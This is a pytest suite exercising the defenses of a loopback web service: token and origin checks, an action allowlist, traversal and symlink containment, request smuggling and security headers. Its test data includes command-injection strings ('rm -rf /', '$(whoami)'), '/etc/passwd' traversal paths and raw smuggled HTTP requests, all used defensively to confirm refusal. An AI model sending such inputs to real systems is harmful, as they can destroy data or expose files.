"""The loopback service's defenses, each one exercised rather than assumed.

A localhost service is reachable by every program and every page on the machine, so each of
these is a real attack surface and not a formality.
"""

from __future__ import annotations

import contextlib
import json
import re
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest
from quest_app.build import build_site
from quest_app.config import AppConfig
from quest_app.errors import ProblemReport
from quest_app.pipeline import load_world
from quest_app.serve import (
    MAX_BODY_BYTES,
    PORTS_DIRNAME,
    UnsafeBindError,
    assert_loopback,
    create_server,
    is_service_running,
)


@pytest.fixture
def service(config: AppConfig) -> Iterator[tuple[str, str]]:
    """A running service on an ephemeral loopback port, torn down after the test."""
    bound = AppConfig.for_repo(
        config.repo_root, participant_root=config.participant_root, service_port=0
    )
    # The service serves what a build produced, so a fixture that never builds would test
    # a 404 rather than the static-file defenses.
    report = ProblemReport()
    world = load_world(bound, report)
    assert world is not None, report.to_text()
    build_site(world)

    server, state = create_server(bound)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{port}", state.token
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def post(
    base: str,
    payload: dict[str, Any] | None = None,
    *,
    headers: dict[str, str] | None = None,
    raw: bytes | None = None,
    content_type: str = "application/json",
) -> tuple[int, dict[str, Any]]:
    data = raw if raw is not None else json.dumps(payload or {}).encode()
    request = urllib.request.Request(  # noqa: S310 - fixed loopback URL built in this test
        f"{base}/api/action",
        data=data,
        method="POST",
        headers={"Content-Type": content_type, **(headers or {})},
    )
    try:
        with urllib.request.urlopen(request, timeout=10) as response:  # noqa: S310
            return response.status, json.loads(response.read())
    except urllib.error.HTTPError as error:
        return error.code, json.loads(error.read())


def post_form(
    base: str, path: str, fields: dict[str, str], *, headers: dict[str, str] | None = None
) -> tuple[int, bytes]:
    """The no-JavaScript route, which the JSON helper above never reaches.

    Every allowlist and token test here posted to `/api/action`, so the form route carried
    the same guards with nothing asserting it.
    """
    data = urllib.parse.urlencode(fields).encode()
    request = urllib.request.Request(  # noqa: S310 - fixed loopback URL built in this test
        f"{base}{path}",
        data=data,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded", **(headers or {})},
    )
    try:
        with urllib.request.urlopen(request, timeout=10) as response:  # noqa: S310
            return response.status, response.read()
    except urllib.error.HTTPError as error:
        return error.code, error.read()


def raw_get(base: str, path: str) -> int:
    """GET without letting the client library tidy the path first.

    `urllib` normalises `/../x` away before the request is sent, so all four traversal
    cases below arrived at the service as ordinary paths and passed even with the
    containment check removed. Over a socket, `GET /../pyproject.toml` on that same mutant
    returned 200 and the file. The control was right; the test never reached it.
    """
    import socket

    host, port = base.removeprefix("http://").split(":")
    request = f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n"
    with socket.create_connection((host, int(port)), timeout=10) as sock:
        sock.sendall(request.encode())
        first = b""
        while b"\r\n" not in first:
            chunk = sock.recv(4096)
            if not chunk:
                break
            first += chunk
    return int(first.split(b" ")[1])


def get(base: str, path: str) -> int:
    try:
        with urllib.request.urlopen(f"{base}{path}", timeout=10) as response:  # noqa: S310
            return int(response.status)
    except urllib.error.HTTPError as error:
        return int(error.code)


class TestBinding:
    """The difference between 127.0.0.1 and 0.0.0.0 is a tool versus a network service."""

    @pytest.mark.parametrize(
        "host",
        ["0.0.0.0", "192.168.1.10", "example.com", "::"],  # noqa: S104 - refusing these is the test
    )
    def test_a_non_loopback_address_is_refused(self, host: str) -> None:
        with pytest.raises(UnsafeBindError):
            assert_loopback(host)

    @pytest.mark.parametrize("host", ["127.0.0.1", "localhost", "::1"])
    def test_loopback_is_accepted(self, host: str) -> None:
        assert assert_loopback(host) is None


class TestARebuildWhileServing:
    """A second process rebuilding the site must not disable the pages being served."""

    def test_the_probe_tells_a_running_service_from_a_dead_port(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        from quest_app.serve import is_service_running

        base, _ = service
        port = int(base.rsplit(":", 1)[1])
        running = AppConfig.for_repo(
            config.repo_root, participant_root=config.participant_root, service_port=port
        )
        # Port 9 is discard: reachable as a concept, never answering as this application.
        dead = AppConfig.for_repo(
            config.repo_root, participant_root=config.participant_root, service_port=9
        )

        assert is_service_running(running) is True
        assert is_service_running(dead) is False

    def test_a_build_while_serving_keeps_the_controls_alive(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        """`quest-app action` built with the offline view whatever was happening.

        One command from a second terminal replaced every served page with a copy saying the
        service was not running and disabling every control, and only restarting the server
        undid it.
        """
        from quest_app.view_models import offline_service_view, online_service_view

        _, _ = service  # the fixture's value is the running server, not its address
        report = ProblemReport()
        world = load_world(config, report)
        assert world is not None, report.to_text()

        def pages_that_can_act() -> int:
            return sum(
                'method="post"' in page.read_text().lower()
                for page in config.generated_root.rglob("index.html")
            )

        build_site(world, service=offline_service_view())
        offline = pages_that_can_act()

        build_site(world, service=online_service_view())
        online = pages_that_can_act()

        assert offline == 0, "the offline view is exactly what the fix has to avoid producing"
        assert online > 0, "a page built while the service runs must still be able to act"


class TestTheFormRoute:
    """The route a participant with JavaScript disabled uses, guarded like the JSON one."""

    def test_an_action_outside_the_allowlist_is_refused(self, service: tuple[str, str]) -> None:
        base, token = service
        status, _ = post_form(
            base, "/api/action/delete-everything/base-camp-repository-safety", {"token": token}
        )
        assert status == 400

    @pytest.mark.parametrize("header", ["Origin", "Referer"])
    def test_a_cross_origin_form_post_is_refused(
        self, service: tuple[str, str], header: str
    ) -> None:
        """`TestCrossOrigin` covers `/api/action` only.

        Round 4 found the form route carrying guards nothing asserted, and round 5 found
        its origin check in the same state: removing it left the whole suite green. The
        token still stands behind it, so this is depth rather than an open door.
        """
        base, token = service
        status, _ = post_form(
            base,
            "/api/action/rebuild/base-camp-repository-safety",
            {"token": token},
            headers={header: "https://evil.example"},
        )
        assert status == 403

    def test_a_wrong_token_is_refused(self, service: tuple[str, str]) -> None:
        base, token = service
        status, _ = post_form(
            base, "/api/action/start-quest/base-camp-repository-safety", {"token": "x" * len(token)}
        )
        assert status == 403

    def test_a_locked_quest_is_refused(self, service: tuple[str, str]) -> None:
        """The same rule the CLI enforces, from the other caller of the shared action layer.

        Prerequisites were computed for display and enforced nowhere, so the browser greyed
        out Start while both POST routes performed it.
        """
        base, token = service
        # With the confirmation the form itself sends, so what this asserts is the
        # prerequisite refusal and not the confirmation one.
        status, body = post_form(
            base,
            "/api/action/start-quest/scrum-standup-digest",
            {"token": token, "confirm": "yes"},
        )

        # The form route answers a refusal the way a page does: a redirect carrying the
        # problem, not a status code only a script would read.
        assert status == 200
        assert b"locked until a reviewer has verified" in body


class TestRequestToken:
    def test_a_state_change_without_a_token_is_refused(self, service: tuple[str, str]) -> None:
        base, _ = service
        status, body = post(base, {"action": "rebuild"})
        assert status == 403
        assert body["ok"] is False

    def test_a_wrong_token_is_refused(self, service: tuple[str, str]) -> None:
        base, token = service
        status, _ = post(base, {"action": "rebuild", "token": "x" * len(token)})
        assert status == 403

    def test_a_token_that_is_not_ascii_is_refused_rather_than_fatal(
        self, service: tuple[str, str]
    ) -> None:
        """A wrong token built out of the letter x cannot catch this.

        `secrets.compare_digest` raises on a `str` carrying a non-ASCII character, inside the
        handler, so one such token took the endpoint down with no HTTP response and a
        traceback holding absolute paths.
        """
        base, token = service
        status, _ = post(base, {"action": "rebuild", "token": "é" * len(token)})
        assert status == 403
        status, _ = post(base, {"action": "rebuild", "token": token})
        assert status == 200, "the service is still answering"

    def test_the_correct_token_is_accepted(self, service: tuple[str, str]) -> None:
        base, token = service
        status, body = post(base, {"action": "rebuild", "token": token})
        assert status == 200
        assert body["ok"] is True

    def test_reading_does_not_require_a_token(self, service: tuple[str, str]) -> None:
        """Health and Git status change nothing, so they are readable without one."""
        base, _ = service
        assert get(base, "/api/health") == 200
        assert get(base, "/api/git-status") == 200


class TestCrossOrigin:
    @pytest.mark.parametrize("header", ["Origin", "Referer"])
    def test_a_cross_origin_state_change_is_refused(
        self, service: tuple[str, str], header: str
    ) -> None:
        """A page on another site must not be able to post here from your browser."""
        base, token = service
        status, _ = post(
            base, {"action": "rebuild", "token": token}, headers={header: "https://evil.example"}
        )
        assert status == 403

    def test_a_same_origin_request_is_accepted(self, service: tuple[str, str]) -> None:
        base, token = service
        status, _ = post(base, {"action": "rebuild", "token": token}, headers={"Origin": base})
        assert status == 200

    def test_an_origin_of_null_is_refused(self, service: tuple[str, str]) -> None:
        """A browser sends `Origin: null` for a genuinely cross-origin or sandboxed request.

        Round 12's C1 fix changes the referrer policy from `no-referrer` to `same-origin` so
        that a *same-origin* form POST stops carrying this value — but the fix must not do it
        by making the check accept `null`. A real cross-origin request still sends it, and it
        must still be refused.
        """
        base, token = service
        status, _ = post(base, {"action": "rebuild", "token": token}, headers={"Origin": "null"})
        assert status == 403


class TestFormRouteCrossOrigin:
    def test_an_origin_of_null_is_refused(self, service: tuple[str, str]) -> None:
        base, token = service
        status, _ = post_form(
            base,
            "/api/action/rebuild/base-camp-repository-safety",
            {"token": token},
            headers={"Origin": "null"},
        )
        assert status == 403


class TestRequestShape:
    def test_a_non_json_content_type_is_refused(self, service: tuple[str, str]) -> None:
        base, token = service
        status, _ = post(base, {"action": "rebuild", "token": token}, content_type="text/plain")
        assert status == 415

    def test_an_oversized_body_is_refused_before_it_is_read(self, service: tuple[str, str]) -> None:
        base, _ = service
        payload = b'{"a":"' + b"x" * (MAX_BODY_BYTES + 1000) + b'"}'
        status, _ = post(base, raw=payload)
        assert status == 413

    def test_a_malformed_body_is_refused(self, service: tuple[str, str]) -> None:
        base, _ = service
        assert post(base, raw=b"not json")[0] == 400

    def test_an_empty_body_is_refused(self, service: tuple[str, str]) -> None:
        base, _ = service
        assert post(base, raw=b"")[0] == 400

    def test_a_json_array_is_refused(self, service: tuple[str, str]) -> None:
        base, _ = service
        assert post(base, raw=b"[1,2,3]")[0] == 400


class TestActionAllowlist:
    @pytest.mark.parametrize(
        "action",
        ["rm -rf /", "eval", "../../etc/passwd", "start-quest; rm -rf /", "", "__import__"],
    )
    def test_an_action_outside_the_allowlist_is_refused(
        self, service: tuple[str, str], action: str
    ) -> None:
        base, token = service
        status, _ = post(base, {"action": action, "token": token})
        assert status == 400

    @pytest.mark.parametrize(
        "quest_id",
        ["../../etc/passwd", "/etc/passwd", "..%2f..%2fetc", "no-such-quest", "", "$(whoami)"],
    )
    def test_a_quest_id_is_matched_against_loaded_content(
        self, service: tuple[str, str], quest_id: str
    ) -> None:
        """No path crosses the boundary: an ID either names loaded content or it is refused."""
        base, token = service
        status, _ = post(base, {"action": "start-quest", "quest_id": quest_id, "token": token})
        assert status == 400


class TestStaticServing:
    @pytest.mark.parametrize(
        "path",
        [
            "/../../etc/passwd",
            "/..%2f..%2fetc%2fpasswd",
            "/../pyproject.toml",
            "/%2e%2e/%2e%2e/etc/passwd",
        ],
    )
    def test_traversal_out_of_the_generated_site_is_refused(
        self, service: tuple[str, str], path: str
    ) -> None:
        base, _ = service
        assert get(base, path) in (403, 404)
        assert raw_get(base, path) in (403, 404), (
            "the same path unnormalised, which is the only form that reaches the check"
        )

    def test_traversal_to_a_file_that_exists_outside_is_refused(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        """The parametrised cases above reach for files that do not exist in a test tree.

        403 and 404 are both acceptable answers there, so they pass whether the containment
        check runs or not. This one plants a real file one level above the output and sends
        the request over a socket, because `urllib` normalises the `..` away before it
        reaches the service. Removing the check turns this into 200 and the file's contents.
        """
        planted = config.repo_root / "planted-secret.txt"
        planted.write_text("not for the browser\n", encoding="utf-8")
        base, _ = service
        assert raw_get(base, "/../planted-secret.txt") == 403

    def test_a_symlink_planted_in_the_output_cannot_escape(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        """Resolving before checking is what makes a planted link land in the same refusal."""
        outside = config.repo_root / "pyproject.toml"
        outside.write_text("[project]\nname='x'\n")
        link = config.generated_root / "escape.toml"
        link.symlink_to(outside)
        base, _ = service
        assert get(base, "/escape.toml") == 403

    def test_the_generated_site_is_served(self, service: tuple[str, str]) -> None:
        base, _ = service
        assert get(base, "/") == 200
        assert get(base, "/map/") == 200

    def test_a_missing_page_says_so(self, service: tuple[str, str]) -> None:
        base, _ = service
        assert get(base, "/no/such/page/") == 404


class TestResponseHeaders:
    def test_every_response_carries_the_security_headers(self, service: tuple[str, str]) -> None:
        base, _ = service
        with urllib.request.urlopen(f"{base}/api/health", timeout=10) as response:  # noqa: S310
            headers = dict(response.headers)
        assert headers["X-Content-Type-Options"] == "nosniff"
        # Not `no-referrer`: that strips the Origin header to "null" on a same-origin form
        # POST too, so `_origin_is_acceptable` refused every action form in a real browser
        # (round 12, C1). `same-origin` still sends nothing cross-origin.
        assert headers["Referrer-Policy"] == "same-origin"
        assert "default-src 'none'" in headers["Content-Security-Policy"]
        assert "frame-ancestors 'none'" in headers["Content-Security-Policy"]


def test_the_token_is_never_written_to_disk(service: tuple[str, str], config: AppConfig) -> None:
    """A token in a file is a token any process on the machine can read."""
    base, token = service
    del base
    for path in config.repo_root.rglob("*"):
        if path.is_file() and path.suffix in {".json", ".yaml", ".md", ".html", ".log"}:
            assert token not in path.read_text(errors="ignore"), f"token leaked into {path.name}"


def test_no_absolute_path_appears_in_an_error_response(
    service: tuple[str, str], config: AppConfig
) -> None:
    base, token = service
    _, body = post(base, {"action": "start-quest", "quest_id": "no-such-quest", "token": token})
    assert str(config.repo_root) not in json.dumps(body)


def test_a_service_error_names_no_internal_detail(service: tuple[str, str]) -> None:
    base, _ = service
    _, body = post(base, raw=b"not json")
    assert "Traceback" not in json.dumps(body)


def deaf_default(config: AppConfig) -> AppConfig:
    """The same configuration, with a default service port nothing can be answering on.

    `is_service_running` always probes the configured port as well as the recorded ones,
    which is the behaviour these tests rely on elsewhere. It also means a developer running
    `make serve` in one terminal and `make check` in another failed three tests here, for a
    service that was working exactly as intended. The port a test calls dead has to be dead.
    """
    import dataclasses
    import socket

    with socket.socket() as probe:
        probe.bind(("127.0.0.1", 0))
        closed = int(probe.getsockname()[1])
    return dataclasses.replace(config, service_port=closed)


class TestFindingTheRunningService:
    """`quest-app action` rebuilds the site, and the pages it writes say whether state can
    change from them. It asks whether a service is running first — at the configured port,
    which is 8765 unless something told it otherwise, and nothing told it otherwise.

    `serve --port` is an advertised flag and `action` has no matching one, so round 4's fix
    for "one CLI action disabled every control on every served page" held only for a service
    on the default port. On any other port the probe found nothing, concluded the service was
    down, and published exactly the dead page it existed to prevent.
    """

    def test_the_probe_asks_at_the_port_the_service_actually_bound(
        self, service: tuple[str, str], config: AppConfig, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Asserted on the URL the probe requests, not on what answers it.

        Asserting "the service was found" passes for the wrong reason on a machine where
        anything at all is listening on 8765, which is exactly the default this defect is
        about. The address asked for is the behaviour.
        """
        import urllib.request

        from quest_app.serve import PORTS_DIRNAME, is_service_running

        base, _ = service
        bound = int(base.rsplit(":", 1)[1])
        assert bound != config.service_port, "the fixture must not sit on the default port"

        port_file = config.local_data_root / PORTS_DIRNAME / "recorded"
        port_file.parent.mkdir(parents=True, exist_ok=True)
        port_file.write_text(f"{bound}\n", encoding="utf-8")

        asked: list[str] = []
        real = urllib.request.urlopen

        def record(url: Any, *args: Any, **kwargs: Any) -> Any:
            asked.append(url if isinstance(url, str) else url.full_url)
            return real(url, *args, **kwargs)

        monkeypatch.setattr(urllib.request, "urlopen", record)
        found = is_service_running(config)

        assert asked == [f"http://{config.service_host}:{bound}/"], (
            f"the probe asked at {asked}, not at the port the service bound"
        )
        assert found, "and the service answers there"

    def test_a_stale_port_file_is_not_believed(self, config: AppConfig) -> None:
        """The file is a hint. The header is the authority."""
        from quest_app.serve import PORTS_DIRNAME, is_service_running, running_service_port

        config = deaf_default(config)

        port_file = config.local_data_root / PORTS_DIRNAME / "recorded"
        port_file.parent.mkdir(parents=True, exist_ok=True)
        port_file.write_text("9\n", encoding="utf-8")
        assert running_service_port(config) == 9
        assert not is_service_running(config)

        port_file.write_text("not a port\n", encoding="utf-8")
        assert running_service_port(config) == config.service_port, "unreadable falls back"


class TestThePortFileLifecycle:
    """One file per bound port, written by the service that bound it and removed by it.

    Round 5 kept a single `service-port` file. A repository can host two services, which
    `serve --port` exists to allow: the second overwrote the first's entry, and whichever
    stopped first deleted it for both. Stopping the second one left the first serving pages
    while every CLI action went back to probing 8765, decided nothing was running, and
    republished every page with its controls dead.
    """

    def test_a_second_service_does_not_erase_the_first(self, config: AppConfig) -> None:
        from quest_app.serve import PORTS_DIRNAME, running_service_ports

        directory = config.local_data_root / PORTS_DIRNAME
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "9101").write_text("9101\n", encoding="utf-8")
        (directory / "9102").write_text("9102\n", encoding="utf-8")

        assert 9101 in running_service_ports(config)
        assert 9102 in running_service_ports(config)

        (directory / "9102").unlink()
        remaining = running_service_ports(config)
        assert 9101 in remaining, "stopping one service must not hide the other"

    def test_an_unreadable_entry_is_skipped_rather_than_read_forever(
        self, config: AppConfig
    ) -> None:
        """The only valid content is a handful of digits.

        An entry symlinked at `/dev/zero` hung the reader until it was killed, and the read
        is bounded now. A large junk file stands in for that here, because a test that opens
        `/dev/zero` on a broken implementation never finishes.
        """
        from quest_app.serve import PORTS_DIRNAME, running_service_ports

        directory = config.local_data_root / PORTS_DIRNAME
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "junk").write_text("9" * 500_000, encoding="utf-8")
        (directory / "9103").write_text("9103\n", encoding="utf-8")

        ports = running_service_ports(config)
        assert 9103 in ports
        assert all(port < 65536 for port in ports), "an entry was read past its bound"

    def test_the_service_removes_its_own_entry_when_it_stops(self, config: AppConfig) -> None:
        """Nothing in the suite failed when shutdown stopped removing the file at all."""
        import signal
        import subprocess
        import sys

        from quest_app.serve import PORTS_DIRNAME

        service = subprocess.Popen(
            [
                sys.executable,
                "-m",
                "quest_app.cli",
                "serve",
                "--repo-root",
                str(config.repo_root),
                "--port",
                "0",
            ],
            stderr=subprocess.PIPE,
            text=True,
        )
        directory = config.local_data_root / PORTS_DIRNAME
        try:
            deadline = time.monotonic() + 60
            while time.monotonic() < deadline:
                if directory.exists() and any(directory.iterdir()):
                    break
                assert service.poll() is None, "the service exited before it bound"
                time.sleep(0.1)
            entries = sorted(p.name for p in directory.iterdir())
            assert entries, "a running service records the port it bound"
            # `--port 0` asks for any free port. Zero is falsy, and `run_service` tested the
            # flag for truth, so it bound the default instead — which this test could not
            # see, because on a machine with 8765 free the default binds and everything
            # looks right. It only showed up as three unrelated failures on a machine
            # already running `make serve`.
            assert str(config.service_port) not in entries, (
                "--port 0 asked for any free port and the service took the default one"
            )
        finally:
            service.send_signal(signal.SIGINT)
            service.wait(timeout=60)

        assert sorted(p.name for p in directory.iterdir()) == [], "the entry outlived it"


class TestRefusalsEndTheConnection:
    """A refusal that leaves the declared body unread hands the sender the next request.

    Every early refusal — wrong content type, an unreadable `Content-Length`, a cross-origin
    header, a wrong token — returns before the body is consumed, and HTTP/1.1 keeps the
    connection open, so the leftover bytes were parsed as a second request with every header
    chosen by whoever sent the first. The token still gates every mutation, so this was a way
    around the origin check rather than an open door, and the origin check is a defence layer
    that is supposed to hold on its own.
    """

    def test_a_refused_post_does_not_answer_the_body_as_a_second_request(
        self, service: tuple[str, str]
    ) -> None:
        import socket

        base, _ = service
        host, port = base.removeprefix("http://").split(":")
        smuggled = b"GET /api/health HTTP/1.1\r\nHost: x\r\n\r\n"
        head = (
            b"POST /api/action HTTP/1.1\r\n"
            + f"Host: {host}:{port}\r\n".encode()
            + b"Content-Type: text/plain\r\n"
            + f"Content-Length: {len(smuggled)}\r\n\r\n".encode()
        )
        with socket.create_connection((host, int(port)), timeout=10) as sock:
            sock.sendall(head + smuggled)
            received = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                received += chunk

        assert received.count(b"HTTP/1.1") == 1, (
            f"the refused body was answered as a second request: {received[:400]!r}"
        )


class TestBindingRefusals:
    def test_a_port_already_in_use_is_reported_rather_than_traced(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        """`serve --port` exists so two services can run; typing a taken port printed a
        socketserver traceback."""
        import subprocess
        import sys

        base, _ = service
        taken = base.rsplit(":", 1)[1]
        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "quest_app.cli",
                "serve",
                "--repo-root",
                str(config.repo_root),
                "--port",
                taken,
            ],
            capture_output=True,
            text=True,
            check=False,
            timeout=120,
        )

        assert result.returncode == 2, result.stderr
        assert "Traceback" not in result.stderr, result.stderr
        assert "cannot listen" in result.stderr and "--port" in result.stderr


class TestNothingLeavesARequestUnanswered:
    """Every request ends in a response, whatever went wrong on the way.

    Three failures were caught by type — `StoreError`, `ValueError`, `OSError` — and
    anything else escaped the handler: no status, no body, a closed connection, and a
    traceback carrying absolute paths on stderr, with the participant's change already on
    disk. A broken template is the easiest way to produce one.
    """

    def _break_the_rebuild(self, config: AppConfig, monkeypatch: pytest.MonkeyPatch) -> None:
        from quest_app import actions

        def explode(*_args: Any, **_kwargs: Any) -> None:
            raise RuntimeError("the rebuild blew up")

        monkeypatch.setattr(actions, "build_site", explode)

    def test_an_unexpected_failure_still_answers_the_json_caller(
        self, service: tuple[str, str], config: AppConfig, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        base, token = service
        self._break_the_rebuild(config, monkeypatch)
        status, body = post(
            base,
            {
                "action": "start-quest",
                "quest_id": "ba-ingest-transcript",
                "token": token,
                "confirm": True,
            },
        )
        # Round 7 asserted a 500 here, because `_rebuild` caught `OSError` and let every
        # other failure escape. Both are the same event: the transition is on disk and the
        # site is stale. A 500 tells the caller their request failed when it did not, and
        # their retry is then refused because the attempt really did move. So the contract
        # is the one the other rebuild failure already had — a complete answer that says
        # what was recorded and what was not.
        assert status == 200, body
        advisories = " ".join(body.get("advisories") or ())
        assert "could not be rebuilt" in advisories, body
        assert "RuntimeError" in advisories, body
        assert str(config.repo_root) not in json.dumps(body)
        assert body.get("state"), "the change the advisory describes must be reported too"

    def test_an_unexpected_failure_still_answers_the_browser(
        self, service: tuple[str, str], config: AppConfig, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        base, token = service
        self._break_the_rebuild(config, monkeypatch)
        status, _ = post_form(
            base,
            "/api/action/start-quest/ba-ingest-transcript",
            {"token": token, "confirm": "yes"},
        )
        assert status == 200  # urllib follows the redirect to the page it came from


class TestTheAdvisoryReachesTheBrowser:
    """The application's one partial success: the change landed, the rebuild did not.

    The form route discarded the action layer's return value, so a participant was told
    nothing at all while a JSON caller was told everything.
    """

    def test_a_failed_rebuild_after_a_form_action_is_reported(
        self, service: tuple[str, str], config: AppConfig, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from quest_app import actions

        def unwritable(*_args: Any, **_kwargs: Any) -> None:
            raise OSError(20, "Not a directory")

        monkeypatch.setattr(actions, "build_site", unwritable)
        base, token = service
        location = self._redirect_of(
            base,
            "/api/action/start-quest/ba-ingest-transcript",
            {"token": token, "confirm": "yes"},
        )
        assert "notice=" in location, location
        assert "rebuilt" in _flash_on(base, location)

        progress = config.participant_root / "progress.yaml"
        assert "ba-ingest-transcript" in progress.read_text()

    @staticmethod
    def _redirect_of(base: str, path: str, fields: dict[str, str]) -> str:
        """The `Location` header, which `urllib` would follow and throw away."""
        import socket

        host, port = base.removeprefix("http://").split(":")
        body = urllib.parse.urlencode(fields)
        request = (
            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
        )
        with socket.create_connection((host, int(port)), timeout=10) as sock:
            sock.sendall(request.encode())
            received = b""
            while b"\r\n\r\n" not in received:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                received += chunk
        for line in received.decode("utf-8", "replace").splitlines():
            if line.lower().startswith("location:"):
                return line.split(":", 1)[1].strip()
        raise AssertionError(f"no Location header in {received!r}")


class TestTheRequestClaimsThisHost:
    """A page at a name that resolves to loopback is same-origin to the browser.

    Every page carries the run's request token, so serving one to a request that arrived
    under someone else's `Host` hands the token to whoever arranged the name.
    """

    def test_a_foreign_host_header_is_refused(self, service: tuple[str, str]) -> None:
        base, _ = service
        request = urllib.request.Request(  # noqa: S310 - fixed loopback URL
            f"{base}/", headers={"Host": "evil.example.com"}
        )
        try:
            with urllib.request.urlopen(request, timeout=10) as response:  # noqa: S310
                status = response.status
        except urllib.error.HTTPError as error:
            status = error.code
        assert status == 403

    def test_the_loopback_host_is_accepted(self, service: tuple[str, str]) -> None:
        assert get(service[0], "/") == 200

    def test_a_get_may_not_carry_a_body(self, service: tuple[str, str]) -> None:
        """An unread body is the next request on a kept-alive connection."""
        import socket

        base, _ = service
        host, port = base.removeprefix("http://").split(":")
        smuggled = "POST /api/action HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\n\r\n"
        request = (
            f"GET /api/health HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Length: {len(smuggled)}\r\n\r\n{smuggled}"
        )
        with socket.create_connection((host, int(port)), timeout=10) as sock:
            sock.sendall(request.encode())
            received = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                received += chunk
        assert received.count(b"HTTP/1.0") + received.count(b"HTTP/1.1") == 1, received
        assert b"400" in received.split(b"\r\n")[0]


class TestTheConfirmationIsNotOnlyInTheBrowser:
    """C21 is rendered as a required checkbox. `required` is the browser's rule.

    `serve.py` also refuses an unconfirmed request before it ever reaches the shared action
    layer, as a friendlier redirect instead of a raised error (see the comment at its
    `CONFIRMATIONS` check). That means the first two tests below, on their own, would still
    pass with the real gate in `quest_app.actions.ActionRunner.perform` deleted — they never
    reach it. The third test calls that layer directly, the same way `quest-app action` does,
    to prove ADR-033's claim that the guard is shared rather than reimplemented once for the
    browser and left out of every other caller.
    """

    def test_an_action_without_its_confirmation_is_refused(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        base, token = service
        location = TestTheAdvisoryReachesTheBrowser._redirect_of(
            base, "/api/action/start-quest/ba-ingest-transcript", {"token": token}
        )
        assert "problem=" in location, location
        assert "confirm" in _flash_on(base, location)
        assert "ba-ingest-transcript" not in (config.participant_root / "progress.yaml").read_text()

    def test_confirming_it_performs_the_action(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        base, token = service
        post_form(
            base,
            "/api/action/start-quest/ba-ingest-transcript",
            {"token": token, "confirm": "yes"},
        )
        assert "ba-ingest-transcript" in (config.participant_root / "progress.yaml").read_text()

    def test_the_shared_action_layer_refuses_it_independently_of_serve_py(
        self, config: AppConfig
    ) -> None:
        """No HTTP server in this test — `ActionRunner.perform` is called exactly as the
        CLI calls it, so `serve.py`'s early redirect cannot be the thing making this pass.
        """
        from quest_app.actions import CONFIRMATIONS, ActionRunner
        from quest_app.content_loader import SchemaSet

        def load() -> Any:
            world = load_world(config, ProblemReport())
            assert world is not None
            return world

        runner = ActionRunner(config, SchemaSet(config.schemas_root), load)
        with pytest.raises(ValueError, match=re.escape(CONFIRMATIONS["start-quest"])):
            runner.perform("start-quest", {"quest_id": "ba-ingest-transcript"})
        assert "ba-ingest-transcript" not in (config.participant_root / "progress.yaml").read_text()


class TestAHalfWrittenFindingIsNotDropped:
    """A reviewer who wrote a finding and left one field empty was told they wrote none.

    The form dropped any row missing one of its three fields, and the refusal that followed
    said needs-changes requires at least one finding — naming the wrong problem to someone
    who had just written one. The CLI already refuses this with the reason.
    """

    def test_the_refusal_names_the_missing_field(self, service: tuple[str, str]) -> None:
        base, token = service
        location = TestTheAdvisoryReachesTheBrowser._redirect_of(
            base,
            "/api/action/record-review/jira-read-assigned-stories",
            {
                "token": token,
                "decision": "needs_changes",
                "reviewer": "A Reviewer",
                "finding_severity": "high",
                "finding_summary": "The reproduction steps do not run",
                "finding_evidence": "",
            },
        )
        problem = _flash_on(base, location)
        assert "evidence" in problem, problem
        assert "at least one finding" not in problem, problem


def _flash_on(base: str, location: str) -> str:
    """The alert the participant sees on the page a redirect sends them to.

    Read from the page rather than the URL: the URL carries only an identifier, so a link
    cannot put words of its own into the alert.
    """
    from html import unescape

    with urllib.request.urlopen(base + location, timeout=10) as response:  # noqa: S310
        page = response.read().decode("utf-8")
    alerts = re.findall(r'<div class="alert[^"]*" role="(?:alert|status)">(.*?)</div>', page, re.S)
    return unescape(re.sub(r"<[^>]+>", "", " ".join(alerts)))


class TestStalePortEntries:
    """A service killed outright never runs its own cleanup.

    Its entry then names a port nothing answers on, and every later `quest-app action` pays
    a connection attempt for it before finding the service that is actually running.
    """

    def _entry(self, config: AppConfig, port: int) -> Path:
        directory = config.local_data_root / PORTS_DIRNAME
        directory.mkdir(parents=True, exist_ok=True)
        entry = directory / str(port)
        entry.write_text(f"{port}\n")
        return entry

    @staticmethod
    def _closed_port() -> int:
        import socket

        with socket.socket() as probe:
            probe.bind(("127.0.0.1", 0))
            return int(probe.getsockname()[1])

    def test_an_entry_for_a_port_nothing_answers_on_is_removed(self, config: AppConfig) -> None:
        config = deaf_default(config)
        entry = self._entry(config, self._closed_port())
        assert is_service_running(config) is False
        assert not entry.exists(), "a refused connection means nobody is there"

    def test_a_live_service_keeps_its_entry(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        base, _ = service
        port = int(base.rsplit(":", 1)[1])
        entry = self._entry(config, port)
        assert is_service_running(config) is True
        assert entry.exists()


class TestARebuildThatFailsAfterTheRecordIsWritten:
    """Every action, not only the ones in the transition table.

    Round 6 made a failed rebuild an advisory on a successful transition. Submission, review
    and validation still rebuilt bare, so the same failure told a participant their
